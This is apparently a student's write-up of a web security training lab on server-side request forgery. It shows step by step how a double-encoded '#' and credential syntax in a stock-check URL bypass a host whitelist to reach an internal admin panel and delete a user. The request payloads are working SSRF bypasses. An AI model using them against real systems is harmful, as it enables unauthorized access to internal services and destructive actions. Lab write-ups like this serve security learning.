# Lab 4: SSRF with whitelist-based input filter

- Vulnerability Feature: stock check
- Goal: change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user carlos

### Analysis
- Open Burp Suite
```html
<!-- Request -->
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1

<!-- Response -->
376
```
- Decode URL
```html
<!-- Request -->
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1

stockApi=http://localhost/


<!-- Response -->
"External stock check host must be stock.weliketoshop.net"
```

```html
<!-- Request -->
stockApi=http://username@stock.weliketoshop.net:8080/

<!-- Response -->
"Missing parameter"
```

```html
<!-- Request -->
stockApi=http://username#@stock.weliketoshop.net:8080/

<!-- Response -->
"External stock check host must be stock.weliketoshop.net"
```

- Endcoed paramert `#` twice
```html
<!-- Request -->
stockApi=http://username%2523@stock.weliketoshop.net:8080/

<!-- Response -->
Could not connect to external stock check service
```

- Change `username` to `localhost`
```html
<!-- Request -->
stockApi=http://localhost%2523@stock.weliketoshop.net:8080/

<!-- Response -->
<a href="/admin">
    Admin panel
</a>
```

```html
<!-- Request -->
stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin

<!-- Response -->
<a href="/admin/delete?username=wiener">
    Delete
</a>
```

- Delete username carlos
```html
<!-- Request -->
stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos
```
- Click `Follow redirection`
- Congratulations!